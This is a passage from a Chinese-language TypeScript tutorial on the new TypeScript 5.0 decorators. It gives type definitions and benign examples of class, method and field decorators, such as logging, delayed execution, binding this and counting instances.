language_">console</span>.<span class="title function_">error</span>(msg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确</span></span><br><span class="line"><span class="title class_">Utility</span>.<span class="title function_">log</span>(<span class="string">&quot;Call me&quot;</span>);</span><br><span class="line"><span class="title class_">Utility</span>.<span class="title function_">error</span>(<span class="string">&quot;maybe!&quot;</span>);</span><br></pre></td></tr></table></figure><p>命名空间本身能被 <code>export</code>、也允许合并（行为类似 interface）；</p><h1 id="Chapter-5-TypeScript-装饰器"><a href="#Chapter-5-TypeScript-装饰器" class="headerlink" title="Chapter 5. TypeScript 装饰器"></a>Chapter 5. TypeScript 装饰器</h1><blockquote><p>TypeScript 曾有旧式语法，这里不再作介绍。本章只介绍 TypeScript 5.0 以后的新式装饰器。</p><p>如果你想使用旧式语法，请向编译器传递 <code>--experimentalDecorators</code> 参数。</p></blockquote><h2 id="5-1-概念"><a href="#5-1-概念" class="headerlink" title="5.1 概念"></a>5.1 概念</h2><p>TypeScript 的装饰器的定义 和 Python 的装饰器的定义一致，和 Java 的装饰器类似。或者说，“装饰器” 的概念是跨语言的、抽象概念。主要内容是：</p><ul><li>前缀是 <code>@</code>，后面必须是一种特殊表达式。这个表达式要求：<strong>要么就是个函数名，要么表达式执行后返回一个函数</strong>；</li><li>这个通过后面表达式所得到的函数称为<u><strong>装饰器函数</strong></u>。装饰器函数可以接受所修饰对象的一些相关值作为参数，<strong>并且要么不返回值（装饰过程），要么返回新对象用来替换原来的目标对象（装饰对象）</strong>。</li></ul><p>装饰器的作用是，<u><strong>通过类似 “外部注入” 的方式，改变被装饰对象的行为</strong></u>。</p><p>比如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Injectable</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样使用类 <code>A</code> 的时候，其行为就会被装饰器 <code>Injectable</code> 所改变。</p><h2 id="5-2-源码定义"><a href="#5-2-源码定义" class="headerlink" title="5.2 源码定义"></a>5.2 源码定义</h2><p>我们从概念中可知，要了解 TypeScript 装饰器怎么用、机制是什么，最主要看装饰器函数。它在 TypeScript 中的定义如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Decorator</span> = <span class="function">(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">  value: <span class="built_in">any</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  context: &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    kind: <span class="built_in">string</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    name: <span class="built_in">string</span> | <span class="built_in">symbol</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    addInitializer?(initializer: () =&gt; <span class="built_in">void</span>): <span class="built_in">void</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">static</span>?: <span class="built_in">boolean</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">private</span>?: <span class="built_in">boolean</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    access: &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">      get?(): <span class="built_in">unknown</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">      set?(value: <span class="built_in">unknown</span>): <span class="built_in">void</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    &#125;;</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"></span>) =&gt;</span> <span class="built_in">void</span> | <span class="title class_">ReplacementValue</span>;</span><br></pre></td></tr></table></figure><p>可以看到，<code>Decorator</code> 是一个函数类型，它接收两个参数：</p><ul><li><p><code>value</code>：<strong>所装饰的对象</strong>，在使用 <code>@Decorator</code> 时，相当于语法糖，<strong>自动将修饰对象传递到此参数</strong>；</p></li><li><p><code>context</code>：上下文对象，看起来有很多内容，实际上是为了适应多种装饰器的类别而定义的（很多可选参数，只需要记住几种常用的装饰器类别就行）；</p><blockquote><p>在 TypeScript 中，定义了一个原生接口 <code>ClassXXXDecoratorContext</code>，描述的就是 <code>typeof Decorator.context</code>；</p></blockquote><ul><li><code>kind</code>：装饰器类别，<strong>只有 6 种，分别对应了 6 种装饰器</strong>：<code>&quot;class&quot;</code>（类装饰器）、<code>&quot;method&quot;</code>（方法装饰器）、<code>&quot;getter&quot;</code>（读装饰器）、<code>&quot;setter&quot;</code>（写装饰器）、<code>&quot;field&quot;</code>（属性装饰器）、<code>&quot;accessor&quot;</code>（访问装饰器）；</li><li><code>name</code>：所装饰对象的名称（例如类名、函数名、属性名等等）；</li><li><code>addInitializer()</code>：<strong>添加被修饰对象初始化后的逻辑</strong>；</li><li><code>private</code>：<strong>所装饰对象是不是一个类的私有成员</strong>；</li><li><code>static</code>：<strong>所装饰对象是不是一个类的静态成员</strong>；</li><li><code>access</code>：<strong>包含所修饰对象的访问器 <code>get</code> 和 <code>set</code></strong>；</li></ul></li></ul><h3 id="5-2-1-类装饰器"><a href="#5-2-1-类装饰器" class="headerlink" title="5.2.1 类装饰器"></a>5.2.1 类装饰器</h3><p>类装饰器是 <code>context.kind</code> 字段为 <code>&quot;class&quot;</code> 的装饰器，<strong>用来装饰 TypeScript 类</strong>。</p><p><u><strong>它只需定义装饰器 <code>context</code> 可选成员的 <code>addInitializer()</code></strong></u>，用在类上就是 <strong>类完全定义后、构造函数前执行的 <code>initializer</code> 函数</strong>。</p><p>如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ClassDecorator</span> = <span class="function">(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">  value: <span class="built_in">Function</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  context: &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    kind: <span class="string">&quot;class&quot;</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    name: <span class="built_in">string</span> | <span class="literal">undefined</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    addInitializer(initializer: () =&gt; <span class="built_in">void</span>): <span class="built_in">void</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"></span>) =&gt;</span> <span class="title class_">Function</span> | <span class="built_in">void</span>;</span><br></pre></td></tr></table></figure><p>常见的使用场景有：</p><ol><li><p>向类中添加一个外部方法；</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Greeter</span>(<span class="params">value, context</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (context.<span class="property">kind</span> === <span class="string">&quot;class&quot;</span>) &#123;</span><br><span class="line">        value.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">greet</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Greeter</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> u = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">u.<span class="title function_">greet</span>();    <span class="comment">// Hello!</span></span><br></pre></td></tr></table></figure><p><strong>作用原理是，向传入其中的类调用 <code>prototype</code> 获取类的原型，添加方法 <code>greet</code></strong>；</p></li><li><p>替换被修饰类的构造函数（例如添加一些 side effects）/ 直接替换被修饰的类；</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">countInstances</span>(<span class="params">value: <span class="built_in">any</span>, context: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> instanceCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> wrapper = <span class="keyword">function</span> (<span class="params">...args: <span class="built_in">any</span>[]</span>) &#123;</span><br><span class="line">    instanceCount++;</span><br><span class="line">    <span class="keyword">const</span> instance = <span class="keyword">new</span> <span class="title function_">value</span>(...args);</span><br><span class="line">    instance.<span class="property">count</span> = instanceCount;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125; <span class="keyword">as</span> <span class="built_in">unknown</span> <span class="keyword">as</span> <span class="keyword">typeof</span> <span class="title class_">MyClass</span>;</span><br><span class="line"></span><br><span class="line">  wrapper.<span class="property"><span class="keyword">prototype</span></span> = value.<span class="property"><span class="keyword">prototype</span></span>; <span class="comment">// A</span></span><br><span class="line">  <span class="keyword">return</span> wrapper;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@countInstances</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> inst1 = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">inst1 <span class="keyword">instanceof</span> <span class="title class_">MyClass</span>; <span class="comment">// true</span></span><br><span class="line">inst1.<span class="property">count</span>; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>解释一下，因为 JavaScript 和 TypeScript 中的类型 <code>class</code>，只要<strong>是个构造函数就能用 <code>class</code> 声明</strong>。借助这个特性，我们能更换被修饰类的构造函数。</p><p>在装饰器内定义一个闭包（新的构造函数，<code>new</code> 调用了原来构造函数），最后将函数的 <code>prototype</code> 属性统一，再返回就是新的构造函数了。</p><p>这个时候，返回的构造函数就替换了原来的构造函数（也就是替换了类）。按这种思想，<strong>如果你不想用 <code>prototype</code> 这种原生 JavaScript 的内容，你还可以直接返回一个临时子类，来实现同样效果</strong>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">countInstances</span>(<span class="params">value: <span class="built_in">any</span>, context: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> instanceCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">class</span> <span class="title class_">extends</span> value &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">...args: <span class="built_in">any</span>[]</span>) &#123;</span><br><span class="line">      <span class="variable language_">super</span>(...args);</span><br><span class="line">      instanceCount++;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">count</span> = instanceCount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>更改被修饰类的创建行为（修改 <code>new</code> 的行为）；</p><p>我们注意到，JavaScript 的构造函数中，有 <code>new</code> 对象可供使用，<code>new.target</code> 表示使用 <code>new</code> 调用这个构造函数的目标对象。我们可以借此控制 <code>new</code> 的行为，例如禁止 <code>new</code> 新建实例：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">functionCallable</span>(<span class="params"></span></span><br><span class="line"><span class="params">  value <span class="keyword">as</span> <span class="built_in">any</span>, &#123;kind&#125; <span class="keyword">as</span> <span class="built_in">any</span></span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (kind === <span class="string">&#x27;class&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">new</span>.<span class="property">target</span> !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeError</span>(<span class="string">&#x27;This function can’t be new-invoked&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">value</span>(...args);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@functionCallable</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> robin = <span class="title class_">Person</span>(<span class="string">&#x27;Robin&#x27;</span>);</span><br><span class="line">robin.<span class="property">name</span> <span class="comment">// &#x27;Robin&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>在类的定义后、类实例初始化前追加行为；</p><p>这里就需要使用到装饰器 <code>addInitializer</code>，<strong>这个函数将在 类的定义结束后（不是实例的定义结束后！） 执行</strong>，例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addInitializeWrapper</span>(<span class="params">name: <span class="built_in">string</span></span>): <span class="title class_">Function</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">wrapper</span>(<span class="params">value: <span class="built_in">any</span>, context: ClassDecoratorContext</span>) &#123;</span><br><span class="line">        context.<span class="title function_">addInitializer</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> wrapper;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@addInitializeWrapper</span>(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test = <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="keyword">var</span> t2 = <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br></pre></td></tr></table></figure><p>会在 <code>Test</code> 定义结束后打印一次 <code>Hello</code>；</p></li></ol><h3 id="5-2-2-方法装饰器"><a href="#5-2-2-方法装饰器" class="headerlink" title="5.2.2 方法装饰器"></a>5.2.2 方法装饰器</h3><p>方法装饰器是 <code>context.kind</code> 字段为 <code>&quot;method&quot;</code> 的装饰器，用来装饰 TypeScript 类中的方法。</p><p>需要指定 <code>static</code>（该方法是否在类中为静态方法）、<code>private</code>（该方法是否在类中为私有方法）、<code>access.get</code>（该方法的读访问器）、<code>addInitializer</code>（该方法定义后的初始化逻辑），如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ClassMethodDecorator</span> = <span class="function">(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">  value: <span class="built_in">Function</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  context: &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    kind: <span class="string">&quot;method&quot;</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    name: <span class="built_in">string</span> | <span class="built_in">symbol</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">static</span>: <span class="built_in">boolean</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">private</span>: <span class="built_in">boolean</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    access: &#123; get: () =&gt; <span class="built_in">unknown</span> &#125;;</span></span></span><br><span class="line"><span class="params"><span class="function">    addInitializer(initializer: () =&gt; <span class="built_in">void</span>): <span class="built_in">void</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"></span>) =&gt;</span> <span class="title class_">Function</span> | <span class="built_in">void</span>;</span><br></pre></td></tr></table></figure><p>常见使用场景有：</p><ol><li><p>直接替换被修饰的方法；</p><p>这种使用方法很简单，就是装饰器函数返回一个新的函数/方法就行，这就算替换了原来的方法，例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">replaceWithHello</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">n: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@replaceWithHello</span></span><br><span class="line">    <span class="title function_">echoName</span>(): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>给被修饰的方法添加额外逻辑（例如打印日志、延时执行、计时、绑定 <code>this</code> 环境等等）；</p><p>这里就举这 3 个例子。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 给被装饰方法添加日志</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addLog</span>(<span class="params">originMethod: <span class="built_in">Function</span>, context: ClassMethodDecoratorContext</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> methodName = <span class="title class_">String</span>(context.<span class="property">name</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">wrapper</span>(<span class="params"><span class="variable language_">this</span>: <span class="built_in">any</span>, ...args: <span class="built_in">any</span>[]</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[DEBUG] Entering method: <span class="subst">$&#123;methodName&#125;</span>`</span>);</span><br><span class="line">        <span class="comment">// 在原有作用域 this 下执行</span></span><br><span class="line">        <span class="keyword">const</span> result = originMethod.<span class="title function_">call</span>(<span class="variable language_">this</span>, ...args);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[DEBUG] Exiting method: <span class="subst">$&#123;methodName&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> wrapper;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 给被装饰方法延迟执行</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">delay</span>(<span class="params">millisecond: <span class="built_in">number</span> = <span class="number">0</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 无论在哪里，只要 typescript 检测到第一个参数是 this，就会自动将当前环境 this 填充进去，不在 JavaScript 中展现出来。</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">wrapper</span>(<span class="params"><span class="variable language_">this</span>: <span class="built_in">any</span>, value: <span class="built_in">Function</span>, context: ClassMethodDecoratorContext</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (context.<span class="property">kind</span> === <span class="string">&#x27;method&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="function">(<span class="params">...args: <span class="built_in">any</span>[]</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">// 和 call 一样，在指定作用域下执行</span></span><br><span class="line">                    value.<span class="title function_">apply</span>(<span class="variable language_">this</span>, args);</span><br><span class="line">                &#125;, millisecond);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> wrapper;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 给被装饰方法自动绑定 this 环境，可以解决 “实例方法被赋给其他变量后语义改变 / 报错” 的问题</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">boundThis</span>(<span class="params">value: <span class="built_in">Function</span>, context: ClassMethodDecoratorContext</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> methodName = context.<span class="property">name</span>;</span><br><span class="line">    <span class="keyword">if</span> (context.<span class="property">private</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`不能绑定私有方法 <span class="subst">$&#123;methodName <span class="keyword">as</span> <span class="built_in">string</span>&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    context.<span class="title function_">addInitializer</span>(<span class="keyword">function</span> (<span class="params"><span class="variable language_">this</span>: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>[methodName] = <span class="variable language_">this</span>[methodName].<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="5-2-3-属性装饰器"><a href="#5-2-3-属性装饰器" class="headerlink" title="5.2.3 属性装饰器"></a>5.2.3 属性装饰器</h3><p>属性装饰器是 <code>context.kind</code> 字段为 <code>&quot;field&quot;</code> 的装饰器，用来装饰定义在类中的属性。</p><p>它需要指定 <code>static</code>、<code>private</code>、<code>addInitializer</code>、<code>access.get</code> 和 <code>access.set</code>（比方法装饰器多了写访问器）；</p><p>另外它还有一个与其他装饰器不同点是，它要么不返回值，要么返回一个函数，该函数会自动执行，用来对所装饰属性进行初始化。该函数的参数是所装饰属性的初始值，该函数的返回值是该属性的最终值。</p><p>所以，这下你能明白属性装饰器的作用了吗？在初始化该属性时会触发一次属性装饰器。定义如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ClassFieldDecorator</span> = <span class="function">(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">  value: <span class="literal">undefined</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  context: &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    kind: <span class="string">&quot;field&quot;</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    name: <span class="built_in">string</span> | <span class="built_in">symbol</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">static</span>: <span class="built_in">boolean</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">private</span>: <span class="built_in">boolean</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">    access: &#123; get: () =&gt; <span class="built_in">unknown</span>; set: (value: <span class="built_in">unknown</span>) =&gt; <span class="built_in">void</span> &#125;;</span></span></span><br><span class="line"><span class="params"><span class="function">    addInitializer(initializer: () =&gt; <span class="built_in">void</span>): <span class="built_in">void</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"></span>) =&gt;</span> <span class="function">(<span class="params">initialValue: <span class="built_in">unknown</span></span>) =&gt;</span> <span class="built_in">unknown</span> | <span class="built_in">void</span>;</span><br></pre></td></tr></table></figure><p>我们还注意到，<code>value</code> 是 <code>undefined</code> 类型，这意味着 <strong>属性装饰器不会自动将属性传给内部（因为没有必要，考虑赋给该属性的值 <code>initialValue</code> 即可）</strong>。</p><p>常见的使用场景和类的访问器类似，不再赘述，只是介绍一个样例：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">logged</span>(<span class="params">value, context</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; kind, name &#125; = context;</span><br><span class="line">  <span class="keyword">if</span> (kind === <span class="string">&quot;field&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">initialValue</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[DEBUG] initializing <span class="subst">$&#123;name&#125;</span> with value <span class="subst">$&#123;initialValue&#125;</span>`</span>);</span><br><span class="line">      <span class="keyword">return</span> initialValue;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">  <span class="meta">@logged</span> name = <span class="string">&quot;green&quot;</span>;</span><br><span class="line">&#125;</span><br><span 